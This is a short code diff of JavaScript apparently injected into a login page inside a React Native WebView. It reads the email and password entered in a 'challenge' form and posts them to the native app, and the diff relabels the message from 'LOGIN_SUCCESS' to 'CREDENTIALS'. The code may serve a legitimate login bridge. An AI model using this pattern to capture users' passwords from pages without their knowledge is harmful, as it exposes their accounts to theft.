@@ -47,10 +47,11 @@ var form = document.querySelector('form[id="challenge"]');
       
 
       const msg = {
-        type: 'LOGIN_SUCCESS',
+        type: 'CREDENTIALS',
         content: { email,password },
       };
       window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+      
       defaultAction();
 
     };
